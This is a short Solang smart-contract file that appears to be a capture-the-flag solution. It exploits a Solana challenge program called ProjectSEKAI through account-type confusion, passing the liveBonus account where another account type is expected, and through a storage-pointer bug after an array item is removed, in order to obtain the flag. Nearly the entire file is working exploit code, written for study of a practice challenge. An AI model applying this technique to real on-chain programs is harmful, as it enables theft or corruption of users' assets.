import "solana";

interface IProjectSEKAI {
    function register() external;
    function claimLiveBonus() external;
    function play(uint64 consumeLiveBonus) external;
    function exchange(uint64 index) external;
}

@program_id("So1bCJvDc3p3PoqbVB33h4qyHrPzikCeDfQ5kpAmjV6")
contract Solve {

    address constant SYSTEM = address"11111111111111111111111111111111";
    address constant CLOCK = address"SysvarC1ock11111111111111111111111111111111";

    @payer(user)
    constructor(address target_id) {
        address user = tx.accounts.user.key;
        address data = tx.accounts[2].key;
        address liveBonus = tx.accounts[3].key;
        address eventInfo = tx.accounts[4].key;

        AccountMeta[4] regMetas = [
            AccountMeta({pubkey: user, is_signer: true, is_writable: true}),
            AccountMeta({pubkey: liveBonus, is_signer: false, is_writable: true}),
            AccountMeta({pubkey: eventInfo, is_signer: false, is_writable: true}),
            AccountMeta({pubkey: SYSTEM, is_signer: false, is_writable: false})
        ];
        // New syntax for contracts on Solana: https://github.com/hyperledger/solang/pull/1517
        IProjectSEKAI.register{program_id: target_id, accounts: regMetas}();

        AccountMeta[3] claimMetas = [
            AccountMeta({pubkey: user, is_signer: true, is_writable: false}),
            AccountMeta({pubkey: liveBonus, is_signer: false, is_writable: true}),  // or use eventInfo
            // https://solang.readthedocs.io/en/v0.3.3/language/builtins.html#block-properties
            AccountMeta({pubkey: CLOCK, is_signer: false, is_writable: false})
        ];
        IProjectSEKAI.claimLiveBonus{program_id: target_id, accounts: claimMetas}();

        AccountMeta[4] exchangeMetas = [
            AccountMeta({pubkey: data, is_signer: false, is_writable: true}),
            AccountMeta({pubkey: user, is_signer: true, is_writable: false}),
            AccountMeta({pubkey: liveBonus, is_signer: false, is_writable: true}),
            // No check for account type
            // Treat lastClaimedAt as the badges field
            AccountMeta({pubkey: liveBonus, is_signer: false, is_writable: true})
        ];
        IProjectSEKAI.exchange{program_id: target_id, accounts: exchangeMetas}(2);
        // Since the code uses the storage pointer to read/write from/to the array
        // After removal, the item will point to the FLAG
        IProjectSEKAI.exchange{program_id: target_id, accounts: exchangeMetas}(0);
    }
}
